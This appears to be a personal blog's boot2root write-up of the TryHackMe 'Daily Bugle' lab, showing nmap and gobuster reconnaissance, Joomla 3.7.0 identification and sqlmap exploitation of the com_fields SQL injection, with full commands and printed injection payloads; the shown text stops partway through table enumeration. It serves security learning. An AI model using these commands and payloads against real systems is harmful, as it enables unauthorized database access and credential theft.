<!doctype html><html lang=en-us><head><title>Daily Bugle Boot2Root Write-Up | Nate Catelli's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="A boot2root writeup of the Daily Bugle host from TryHackMe."><meta name=generator content="Hugo 0.101.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css></head><body><nav class=navigation><a href=/><span class=arrow>‚Üê</span>Home</a>
<a href=/posts>Archive</a>
<a href=/tags>Tags</a>
<a href=/about>About</a>
<a href=/projects>Projects</a>
<a href=/misc>Misc</a>
<a class=button href=https://ncatelli.github.io/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>Daily Bugle Boot2Root Write-Up</h1><div class=tip><time datetime="2020-11-27 00:00:00 +0000 UTC">Nov 27, 2020</time>
<span class=split>¬∑</span>
<span>4640 words</span>
<span class=split>¬∑</span>
<span>22 minute read</span></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#environment>Environment</a></li><li><a href=#attack>Attack</a><ul><li><a href=#host-enumeration>Host enumeration</a></li><li><a href=#enumerating-directories-on-the-site>Enumerating directories on the site</a></li><li><a href=#mapping-the-database>Mapping the database</a></li><li><a href=#cracking-the-hash>Cracking the hash</a></li><li><a href=#catching-a-shell>Catching a shell</a></li><li><a href=#local-enumeration>Local enumeration</a></li><li><a href=#horizontal-local-privilege-escalation>Horizontal local privilege escalation</a></li><li><a href=#local-enumeration-again>Local enumeration again</a></li><li><a href=#exploiting-yum-for-vertical-escalation>Exploiting yum for vertical escalation</a></li></ul></li><li><a href=#summary>Summary</a></li></ul></nav></div></details></aside><div class=content><h2 id=introduction>Introduction <a href=#introduction class=anchor>üîó</a></h2><p>The Daily Bugle challenge was exceptionally difficult compared to challenges that I&rsquo;ve attempted in the past. It was incredibly easy to rabbithole down paths if I wasn&rsquo;t diligent both in thinking about how to collect information but in documenting the information that I had gathered. In this post, I&rsquo;ll talk through my experience in tackling this challenge and especially focus on the rabbitholes I fell victim to, however it may be difficult to fully capture the amount of time spent in these in writing.</p><h2 id=environment>Environment <a href=#environment class=anchor>üîó</a></h2><p>The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target host. I was given hardly any information about the host other than that there would be two flags on the host, a user and root flag.</p><h2 id=attack>Attack <a href=#attack class=anchor>üîó</a></h2><p>Prior to starting initial recon, I opened up a metasploit console and connected it to the msfdb postgres backend to gather any information that I had found into a single point. I also had set up burp suite to run on port 8080 and configured the local CA in Firefox. Finally I installed gobuster and seclists in anticipation of any enumeration I might need to do. I&rsquo;m looking forward to these being included with Kali though I really only uses them for personal preference reasons.</p><h3 id=host-enumeration>Host enumeration <a href=#host-enumeration class=anchor>üîó</a></h3><p>After this initial setup, I started with a SYN, OS and Version scan of the host to attempt to identify what this target host was.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; db_nmap -sS -sV -O 10.10.162.223
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-28 01:45 UTC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-162.223.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.162.223<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Host is up <span style=color:#f92672>(</span>0.00059s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Not shown: <span style=color:#ae81ff>997</span> closed ports
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 22/tcp   open  ssh     OpenSSH 7.4 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 80/tcp   open  http    Apache httpd 2.4.6 <span style=color:#f92672>((</span>CentOS<span style=color:#f92672>)</span> PHP/5.6.40<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 3306/tcp open  mysql   MariaDB <span style=color:#f92672>(</span>unauthorized<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: MAC Address: 02:72:4F:1F:35:95 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Device type: general purpose
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Running: Linux 3.X
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS CPE: cpe:/o:linux:linux_kernel:3
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS details: Linux 3.10 - 3.13
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Network Distance: <span style=color:#ae81ff>1</span> hop
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 16.23 seconds
</span></span></code></pre></div><p>This scan told me that the target looked to be a linux host, specifically running a 3.10-3.13 kernel. It also told me that, atleast initially, it would look like it was running a LAMP stack. I figured at this point it would be a good chance to do some happy path clicking around the site.</p><h4 id=visiting-the-daily-bugle>Visiting the Daily Bugle <a href=#visiting-the-daily-bugle class=anchor>üîó</a></h4><p>I opened the site in my browser to what looked like a news-focused blog.</p><p><p class=markdown-image><img src=/images/daily_bugle_http_index.png alt="daily index"></p></p><p>There wasn&rsquo;t any immediately links available to any sort of admin page, outside of a simple login panel on the homepage. Happy path clicking around the site also didn&rsquo;t yield any other information about potential users or even which CMS the site was using as far as I could identify. Without a hint of a username I didn&rsquo;t want to attempt any bruteforce.</p><p>Thus, I decided to enumerate directories on the site to see if I could find anything that would yield more information about what kinda site this was.</p><h3 id=enumerating-directories-on-the-site>Enumerating directories on the site <a href=#enumerating-directories-on-the-site class=anchor>üîó</a></h3><p>In order to run the directory enumeration, I reached for my favorite enumeration tool and directory wordlist.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# gobuster dir -u <span style=color:#e6db74>&#39;http://10.10.162.223&#39;</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.0.1
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@_FireFart_<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:            http://10.10.162.223
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:        <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Status codes:   200,204,301,302,307,401,403
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:     gobuster/3.0.1
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:        10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2020/11/27 21:01:06 Starting gobuster
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/images <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/templates <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/media <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/modules <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/bin <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/plugins <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/includes <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/language <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/components <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/cache <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/libraries <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/tmp <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/layouts <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/administrator <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/cli <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2020/11/27 21:01:39 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>This returned a huge number of useful directories including an <code>/administrator</code> page that looked promising. Upon browsing to this page I found a standard admin login page.</p><p><p class=markdown-image><img src=/images/daily_bugle_http_administrator.png alt="daily administrator page"></p></p><p>However, this atleast told me that I was investigating a Joomla site. Using the <code>auxiliary/scanner/http/joomla_version</code> module in metasploit I was able to also determine that this host was running version Joomla <code>3.7.0</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 auxiliary<span style=color:#f92672>(</span>scanner/http/joomla_version<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Server: Apache/2.4.6 <span style=color:#f92672>(</span>CentOS<span style=color:#f92672>)</span> PHP/5.6.40
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Joomla version: 3.7.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Scanned <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> hosts <span style=color:#f92672>(</span>100% complete<span style=color:#f92672>)</span>
</span></span></code></pre></div><h4 id=looking-for-an-vulnerability>Looking for an vulnerability <a href=#looking-for-an-vulnerability class=anchor>üîó</a></h4><p>With a version and CMS in mind I decided to feed the pair into searchsploit to see if anything turned up on exploit-db.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# searchsploit -w joomla | grep 3.7.0
</span></span><span style=display:flex><span>Joomla! 3.7.0 - <span style=color:#e6db74>&#39;com_fields&#39;</span> SQL Injection    | https://www.exploit-db.com/exploits/42033
</span></span></code></pre></div><p>This yielded a single sql injection vulnerability that exploited a parameter in the com_fields component. Specifically, it identified that this component was vulnerable to an error-based injection as well as a time-based and boolean-based blind injection. Further information on the specific vulnerability can be found on the <a href=https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html target=_blank rel=noopener>sucuri blog</a>.</p><h3 id=mapping-the-database>Mapping the database <a href=#mapping-the-database class=anchor>üîó</a></h3><p>I decided to try to map out the database to see if I could leak the admin credentials through one of these injection methods. To start, I ran a <code>sqlmap</code> command with the <code>TEB</code> techniques, representing each of the identified techniques in the vulnerability listing, and the <code>--dbs</code> flag to attempt to identify the joomla database. I&rsquo;ve truncated some of the output to save space. It&rsquo;s worth noting that this run took quite a while as it was left intentionally broad to identify more information about the database.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 auxiliary<span style=color:#f92672>(</span>scanner/http/joomla_version<span style=color:#f92672>)</span> &gt; sqlmap -u <span style=color:#e6db74>&#34;http://10.10.162.223/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> -p <span style=color:#e6db74>&#39;list[fullordering]&#39;</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --random-agent --proxy http://127.0.0.1:8080 --technique<span style=color:#f92672>=</span>TEB --dbs
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> exec: sqlmap -u <span style=color:#e6db74>&#34;http://10.10.162.223/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> -p <span style=color:#e6db74>&#39;list[fullordering]&#39;</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --random-agent --proxy http://127.0.0.1:8080 --technique<span style=color:#f92672>=</span>TEB --dbs
</span></span><span style=display:flex><span> ___ ___<span style=color:#f92672>[</span>.<span style=color:#f92672>]</span>_____ ___ ___  <span style=color:#f92672>{</span>1.4.8#stable<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>|_ -| . <span style=color:#f92672>[)]</span>     | .<span style=color:#e6db74>&#39;| . |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|___|_  [,]_|_|_|__,|  _|
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      |_|V...       |_|   http://sqlmap.org
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span style=color:#66d9ef>for</span> any misuse or damage caused by this program
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> starting @ 21:08:05 /2020-11-27/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:06<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetched random HTTP User-Agent header value <span style=color:#e6db74>&#39;Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009040312 Gentoo Firefox/3.0.8&#39;</span> from file <span style=color:#e6db74>&#39;/usr/share/sqlmap/data/txt/user-agents.txt&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:07<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing connection to the target URL
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:07<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> the web server responded with an HTTP error code <span style=color:#f92672>(</span>500<span style=color:#f92672>)</span> which could interfere with the results of the tests
</span></span><span style=display:flex><span>you have not declared cookie<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>, <span style=color:#66d9ef>while</span> server wants to set its own <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;eaa83fe8b963ab08ce9ab7d4a798de05=m0itckdsrg4...abd2rhmpp7&#39;</span><span style=color:#f92672>)</span>. Do you want to use those <span style=color:#f92672>[</span>Y/n<span style=color:#f92672>]</span> Y
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:10<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> checking <span style=color:#66d9ef>if</span> the target is protected by some kind of WAF/IPS
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:10<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#66d9ef>if</span> the target URL content is stable
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:10<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> target URL content is stable
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:11<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> heuristic <span style=color:#f92672>(</span>basic<span style=color:#f92672>)</span> test shows that GET parameter <span style=color:#e6db74>&#39;list[fullordering]&#39;</span> might be injectable <span style=color:#f92672>(</span>possible DBMS: <span style=color:#e6db74>&#39;MySQL&#39;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:11<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#66d9ef>for</span> SQL injection on GET parameter <span style=color:#e6db74>&#39;list[fullordering]&#39;</span>
</span></span><span style=display:flex><span>it looks like the back-end DBMS is <span style=color:#e6db74>&#39;MySQL&#39;</span>. Do you want to skip test payloads specific <span style=color:#66d9ef>for</span> other DBMSes? <span style=color:#f92672>[</span>Y/n<span style=color:#f92672>]</span> Y
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:17<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:17<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> reflective value<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> found and filtering out
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:08:29<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;OR boolean-based blind - WHERE or HAVING clause&#39;</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:22:49<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#e6db74>&#39;MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:02<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> GET parameter <span style=color:#e6db74>&#39;list[fullordering]&#39;</span> appears to be <span style=color:#e6db74>&#39;MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)&#39;</span> injectable 
</span></span><span style=display:flex><span>GET parameter <span style=color:#e6db74>&#39;list[fullordering]&#39;</span> is vulnerable. Do you want to keep testing the others <span style=color:#f92672>(</span><span style=color:#66d9ef>if</span> any<span style=color:#f92672>)</span>? <span style=color:#f92672>[</span>y/N<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>sqlmap identified the following injection point<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> with a total of <span style=color:#ae81ff>2299</span> HTTP<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> requests:
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>Parameter: list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>GET<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Type: error-based
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.0 error-based - Parameter replace <span style=color:#f92672>(</span>FLOOR<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: option<span style=color:#f92672>=</span>com_fields&amp;view<span style=color:#f92672>=</span>fields&amp;layout<span style=color:#f92672>=</span>modal&amp;list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]=(</span>SELECT <span style=color:#ae81ff>8098</span> FROM<span style=color:#f92672>(</span>SELECT COUNT<span style=color:#f92672>(</span>*<span style=color:#f92672>)</span>,CONCAT<span style=color:#f92672>(</span>0x71786a6b71,<span style=color:#f92672>(</span>SELECT <span style=color:#f92672>(</span>ELT<span style=color:#f92672>(</span>8098<span style=color:#f92672>=</span>8098,1<span style=color:#f92672>)))</span>,0x71706b6271,FLOOR<span style=color:#f92672>(</span>RAND<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>*2<span style=color:#f92672>))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span style=color:#f92672>)</span>a<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Type: time-based blind
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.0.12 time-based blind - Parameter replace <span style=color:#f92672>(</span>substraction<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: option<span style=color:#f92672>=</span>com_fields&amp;view<span style=color:#f92672>=</span>fields&amp;layout<span style=color:#f92672>=</span>modal&amp;list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]=(</span>SELECT <span style=color:#ae81ff>9257</span> FROM <span style=color:#f92672>(</span>SELECT<span style=color:#f92672>(</span>SLEEP<span style=color:#f92672>(</span>5<span style=color:#f92672>)))</span>iXhJ<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:24<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> the back-end DBMS is MySQL
</span></span><span style=display:flex><span>back-end DBMS: MySQL &gt;<span style=color:#f92672>=</span> 5.0 <span style=color:#f92672>(</span>MariaDB fork<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:28<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching database names
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:30<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;information_schema&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:31<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;joomla&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:32<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;mysql&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:33<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;performance_schema&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:34<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;test&#39;</span>
</span></span><span style=display:flex><span>available databases <span style=color:#f92672>[</span>5<span style=color:#f92672>]</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> information_schema
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> joomla
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> mysql
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> performance_schema
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> test
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:34<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> HTTP error codes detected during run:
</span></span><span style=display:flex><span><span style=color:#ae81ff>500</span> <span style=color:#f92672>(</span>Internal Server Error<span style=color:#f92672>)</span> - <span style=color:#ae81ff>2261</span> times
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:23:34<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetched data logged to text files under <span style=color:#e6db74>&#39;/root/.local/share/sqlmap/output/10.10.162.223&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ending @ 21:23:34 /2020-11-27/
</span></span></code></pre></div><p>This eventually identified valid injection techniques which could be used to further refine the <code>sqlmap</code> command. It also confirmed that the joomla database was in fact called <code>joomla</code>.</p><p>With this in mind, I was able to refine my <code>sqlmap</code> command to attempt to map the tables in the <code>joomla</code> database. Again, the output was truncated for space. While this identified many tables, I&rsquo;ve included only a few of the most interesting.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 auxiliary<span style=color:#f92672>(</span>scanner/http/joomla_version<span style=color:#f92672>)</span> &gt; sqlmap -u <span style=color:#e6db74>&#34;http://10.10.162.223/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> -p <span style=color:#e6db74>&#39;l
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ist[fullordering]&#39;</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --random-agent --proxy http://127.0.0.1:8080 --technique<span style=color:#f92672>=</span>TE --dbms<span style=color:#f92672>=</span>MySQL -D joomla --tables
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> exec: sqlmap -u <span style=color:#e6db74>&#34;http://10.10.162.223/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> -p <span style=color:#e6db74>&#39;list[fullordering]&#39;</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --level<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>5</span> --random-agent --proxy http://127.0.0.1:8080 --technique<span style=color:#f92672>=</span>TE --dbms<span style=color:#f92672>=</span>MySQL -D joomla --tables
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ___
</span></span><span style=display:flex><span>       __H__
</span></span><span style=display:flex><span> ___ ___<span style=color:#f92672>[</span>.<span style=color:#f92672>]</span>_____ ___ ___  <span style=color:#f92672>{</span>1.4.8#stable<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>|_ -| . <span style=color:#f92672>[)]</span>     | .<span style=color:#e6db74>&#39;| . |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|___|_  [,]_|_|_|__,|  _|
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      |_|V...       |_|   http://sqlmap.org
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span style=color:#66d9ef>for</span> any misuse or damage caused by this program
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> starting @ 21:26:25 /2020-11-27/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:25<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetched random HTTP User-Agent header value <span style=color:#e6db74>&#39;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; es) AppleWebKit/419 (KHTML, like Gecko) Safari/419.3&#39;</span> from file <span style=color:#e6db74>&#39;/usr/share/sqlmap/data/txt/user-agents.txt&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:25<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing connection to the target URL
